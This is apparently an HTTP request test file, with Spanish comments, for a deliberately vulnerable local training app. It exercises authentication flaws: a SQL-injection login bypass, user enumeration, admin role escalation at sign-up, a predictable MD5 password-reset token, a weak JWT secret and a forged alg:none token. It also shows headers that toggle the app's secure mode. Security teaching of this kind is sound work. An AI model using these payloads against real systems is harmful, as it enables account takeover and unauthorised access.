### PARTE 2 — Autenticación (I1, C1, C2, C3, B2, B5, A1–A5)
### ═════════════════════════════════════════════════════════════

@base = http://localhost:3000

### Login legítimo (vulnerable: contraseñas MD5 verificadas)
POST {{base}}/api/auth/login
Content-Type: application/json

{ "email": "admin@dulcenube.com", "password": "admin123" }

### I1 — SQLi Login (bypass total)
POST {{base}}/api/auth/login
Content-Type: application/json

{ "email": "admin@dulcenube.com' --", "password": "loquesea" }

### I1 + A4 — Enumeración: email existente con password mal
POST {{base}}/api/auth/login
Content-Type: application/json

{ "email": "admin@dulcenube.com", "password": "mal" }

### I1 + A4 — Enumeración: email inexistente
POST {{base}}/api/auth/login
Content-Type: application/json

{ "email": "noexiste@dulcenube.com", "password": "mal" }

### B5 — Registro con escalada de rol
POST {{base}}/api/auth/register
Content-Type: application/json

{ "name": "Mallory", "email": "mallory@evil.lab", "password": "1234", "role": "admin" }

### A5 — Contraseña débil aceptada (registro)
POST {{base}}/api/auth/register
Content-Type: application/json

{ "name": "Ana", "email": "ana@example.com", "password": "1" }

### B2 — /me sin token devuelve admin
GET {{base}}/api/me

### C3 — Reset de admin (token = md5 del email)
POST {{base}}/api/auth/forgot
Content-Type: application/json

{ "email": "admin@dulcenube.com" }

### C3 — Reset con token predecible (md5 de admin@dulcenube.com)
POST {{base}}/api/auth/reset-password
Content-Type: application/json

{ "token": "0192023a7bbd73250516f069df18b500", "newPassword": "pwned123" }

### A2 — Login firmado con secreto débil "secret"
# Para generar el token: https://jwt.io o usa jwt-cli
# Header:  { "alg": "HS256", "typ": "JWT" }
# Payload: { "id": 1, "role": "admin" }
# Firmado con "secret"
POST {{base}}/api/auth/login
Content-Type: application/json

{ "email": "admin@dulcenube.com", "password": "admin123" }

### A1 — Forjar token con alg:none (sin firma)
GET {{base}}/api/me
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwicm9sZSI6ImFkbWluIn0.

### Toggle seguro: /me con X-Security-Mode
GET {{base}}/api/me
X-Security-Mode: secure

### Toggle granular: solo desactiva SQLI_LOGIN
POST {{base}}/api/auth/login
X-Vulnerability-Override: SQLI_LOGIN=false
Content-Type: application/json

{ "email": "admin@dulcenube.com' --", "password": "x" }